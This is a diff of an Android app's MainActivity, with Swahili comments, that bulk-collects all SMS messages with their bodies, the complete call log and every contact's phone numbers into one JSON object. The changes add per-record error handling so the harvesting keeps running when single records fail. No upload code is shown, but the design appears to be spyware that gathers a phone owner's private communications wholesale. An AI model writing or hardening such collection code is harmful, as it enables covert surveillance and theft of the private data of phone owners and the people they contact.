@@ -135,21 +135,21 @@ public class MainActivity extends AppCompatActivity {
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                 collectedData.put("sms_messages", collectSMSMessages());
             } else {
-                collectedData.put("sms_messages", new JSONArray().put(new JSONObject().put("error", "SMS permission denied")));
+                collectedData.put("sms_messages", createErrorArray("SMS permission denied"));
             }
 
             // 2. COLLECT CALL LOGS ZOTE (za zamani na za sasa)
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                 collectedData.put("call_logs", collectCallLogs());
             } else {
-                collectedData.put("call_logs", new JSONArray().put(new JSONObject().put("error", "Call log permission denied")));
+                collectedData.put("call_logs", createErrorArray("Call log permission denied"));
             }
 
             // 3. COLLECT CONTACTS ZOTE
             if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                 collectedData.put("contacts", collectContacts());
             } else {
-                collectedData.put("contacts", new JSONArray().put(new JSONObject().put("error", "Contacts permission denied")));
+                collectedData.put("contacts", createErrorArray("Contacts permission denied"));
             }
 
             // 4. DEVICE INFORMATION (haitaji ruhusa)
@@ -165,6 +165,18 @@ public class MainActivity extends AppCompatActivity {
         }
     }
 
+    private JSONArray createErrorArray(String errorMessage) {
+        JSONArray errorArray = new JSONArray();
+        try {
+            JSONObject errorObj = new JSONObject();
+            errorObj.put("error", errorMessage);
+            errorArray.put(errorObj);
+        } catch (Exception e) {
+            Log.e("ERROR_ARRAY", "Error creating error array: " + e.getMessage());
+        }
+        return errorArray;
+    }
+
     private JSONArray collectSMSMessages() {
         JSONArray smsList = new JSONArray();
         Cursor cursor = null;
@@ -178,18 +190,22 @@ public class MainActivity extends AppCompatActivity {
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext()) {
-                    JSONObject sms = new JSONObject();
-                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
-                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
-                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
-                    sms.put("type", getSMSType(cursor.getString(cursor.getColumnIndexOrThrow("type"))));
-                    sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow("read")));
-                    smsList.put(sms);
-                    count++;
-                    
-                    // Toa angalizo kwenye log kwa ajili ya ukaguzi
-                    if (count % 50 == 0) {
-                        Log.d("SMS_COLLECTION", "Imesoma SMS: " + count);
+                    try {
+                        JSONObject sms = new JSONObject();
+                        sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
+                        sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
+                        sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
+                        sms.put("type", getSMSType(cursor.getString(cursor.getColumnIndexOrThrow("type"))));
+                        sms.put("read", cursor.getString(cursor.getColumnIndexOrThrow("read")));
+                        smsList.put(sms);
+                        count++;
+                        
+                        // Toa angalizo kwenye log kwa ajili ya ukaguzi
+                        if (count % 50 == 0) {
+                            Log.d("SMS_COLLECTION", "Imesoma SMS: " + count);
+                        }
+                    } catch (Exception e) {
+                        Log.e("SMS_ITEM", "Error with SMS item: " + e.getMessage());
                     }
                 }
                 Log.d("SMS_COLLECTION", "Jumla ya SMS zilizokusanywa: " + count);
@@ -197,7 +213,13 @@ public class MainActivity extends AppCompatActivity {
             }
         } catch (Exception e) {
             Log.e("SMS_COLLECTION", "Error reading SMS: " + e.getMessage());
-            smsList.put(new JSONObject().put("error", e.getMessage()));
+            try {
+                JSONObject errorObj = new JSONObject();
+                errorObj.put("error", e.getMessage());
+                smsList.put(errorObj);
+            } catch (Exception jsonError) {
+                Log.e("SMS_ERROR", "Error creating error object: " + jsonError.getMessage());
+            }
         } finally {
             if (cursor != null && !cursor.isClosed()) {
                 cursor.close();
@@ -219,18 +241,22 @@ public class MainActivity extends AppCompatActivity {
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext()) {
-                    JSONObject call = new JSONObject();
-                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
-                    call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
-                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
-                    call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
-                    call.put("type", getCallType(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
-                    callsList.put(call);
-                    count++;
-                    
-                    // Toa angalizo kwenye log kwa ajili ya ukaguzi
-                    if (count % 50 == 0) {
-                        Log.d("CALL_COLLECTION", "Imesoma simu: " + count);
+                    try {
+                        JSONObject call = new JSONObject();
+                        call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
+                        call.put("name", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.CACHED_NAME)));
+                        call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
+                        call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
+                        call.put("type", getCallType(cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE))));
+                        callsList.put(call);
+                        count++;
+                        
+                        // Toa angalizo kwenye log kwa ajili ya ukaguzi
+                        if (count % 50 == 0) {
+                            Log.d("CALL_COLLECTION", "Imesoma simu: " + count);
+                        }
+                    } catch (Exception e) {
+                        Log.e("CALL_ITEM", "Error with call item: " + e.getMessage());
                     }
                 }
                 Log.d("CALL_COLLECTION", "Jumla ya simu zilizokusanywa: " + count);
@@ -238,7 +264,13 @@ public class MainActivity extends AppCompatActivity {
             }
         } catch (Exception e) {
             Log.e("CALL_COLLECTION", "Error reading call logs: " + e.getMessage());
-            callsList.put(new JSONObject().put("error", e.getMessage()));
+            try {
+                JSONObject errorObj = new JSONObject();
+                errorObj.put("error", e.getMessage());
+                callsList.put(errorObj);
+            } catch (Exception jsonError) {
+                Log.e("CALL_ERROR", "Error creating error object: " + jsonError.getMessage());
+            }
         } finally {
             if (cursor != null && !cursor.isClosed()) {
                 cursor.close();
@@ -260,36 +292,53 @@ public class MainActivity extends AppCompatActivity {
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext()) {
-                    JSONObject contact = new JSONObject();
-                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
-                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
-                    contact.put("name", name);
+                    try {
+                        JSONObject contact = new JSONObject();
+                        String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
+                        String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
+                        contact.put("name", name);
 
-                    // Get phone numbers ZOTE
-                    JSONArray phones = new JSONArray();
-                    Cursor phoneCursor = getContentResolver().query(
-                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                            null,
-                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                            new String[]{contactId},
-                            null
-                    );
-                    if (phoneCursor != null) {
-                        while (phoneCursor.moveToNext()) {
-                            String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
-                            if (phone != null && !phone.trim().isEmpty()) {
-                                phones.put(phone);
+                        // Get phone numbers ZOTE
+                        JSONArray phones = new JSONArray();
+                        Cursor phoneCursor = null;
+                        try {
+                            phoneCursor = getContentResolver().query(
+                                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                                    null,
+                                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                                    new String[]{contactId},
+                                    null
+                            );
+                            if (phoneCursor != null) {
+                                while (phoneCursor.moveToNext()) {
+                                    try {
+                                        String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER));
+                                        if (phone != null && !phone.trim().isEmpty()) {
+                                            phones.put(phone);
+                                        }
+                                    } catch (Exception e) {
+                                        Log.e("PHONE_ITEM", "Error with phone item: " + e.getMessage());
+                                    }
+                                }
+                                phoneCursor.close();
+                            }
+                        } catch (Exception e) {
+                            Log.e("PHONES_COLLECTION", "Error reading phones: " + e.getMessage());
+                        } finally {
+                            if (phoneCursor != null && !phoneCursor.isClosed()) {
+                                phoneCursor.close();
                             }
                         }
-                        phoneCursor.close();
-                    }
-                    contact.put("phones", phones);
-                    contactsList.put(contact);
-                    count++;
-                    
-                    // Toa angalizo kwenye log kwa ajili ya ukaguzi
-                    if (count % 50 == 0) {
-                        Log.d("CONTACTS_COLLECTION", "Imesoma majina: " + count);
+                        contact.put("phones", phones);
+                        contactsList.put(contact);
+                        count++;
+                        
+                        // Toa angalizo kwenye log kwa ajili ya ukaguzi
+                        if (count % 50 == 0) {
+                            Log.d("CONTACTS_COLLECTION", "Imesoma majina: " + count);
+                        }
+                    } catch (Exception e) {
+                        Log.e("CONTACT_ITEM", "Error with contact item: " + e.getMessage());
                     }
                 }
                 Log.d("CONTACTS_COLLECTION", "Jumla ya majina yaliyokusanywa: " + count);
@@ -297,7 +346,13 @@ public class MainActivity extends AppCompatActivity {
             }
         } catch (Exception e) {
             Log.e("CONTACTS_COLLECTION", "Error reading contacts: " + e.getMessage());
-            contactsList.put(new JSONObject().put("error", e.getMessage()));
+            try {
+                JSONObject errorObj = new JSONObject();
+                errorObj.put("error", e.getMessage());
+                contactsList.put(errorObj);
+            } catch (Exception jsonError) {
+                Log.e("CONTACTS_ERROR", "Error creating error object: " + jsonError.getMessage());
+            }
         } finally {
             if (cursor != null && !cursor.isClosed()) {
                 cursor.close();
